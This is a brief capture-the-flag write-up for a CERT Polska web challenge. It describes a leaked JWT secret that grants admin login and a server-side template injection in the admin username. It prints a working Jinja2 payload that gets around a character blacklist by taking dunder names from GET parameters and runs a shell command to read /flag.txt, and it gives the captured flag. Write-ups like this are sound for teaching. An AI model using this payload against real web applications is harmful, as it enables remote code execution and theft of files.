# [web - Just Wonderful Turtles](https://hack.cert.pl/challenge/justwonderfulturtles)

In one of the picture's comments, there is a leaked JWT secret. Using it, you can log in as an admin. On the admin's page, there is an SSTI vulnerability in the admin's username. Admin verification is based on `.startswith("admin")`, so you can inject code after the word `admin` in the username. However, 4 characters are banned: `|`, `_`, `"`, `'`, which makes it tricky. You can use request GET parameters as keys of dicts instead.

#### Username payload
```
admin{{ request[request.args.a][request.args.b][request.args.c][request.args.d](request.args.e).popen(request.args.f).read() }}
```

#### GET request
```
https://turtles.ecsc24.hack.cert.pl/admin?a=application&b=__globals__&c=__builtins__&d=__import__&e=os&f=cat%20/flag.txt
```

The whole solution is in `sol.py`.

### Flag
```
ecsc24{turt13s_REa1lY_r0ck!}
```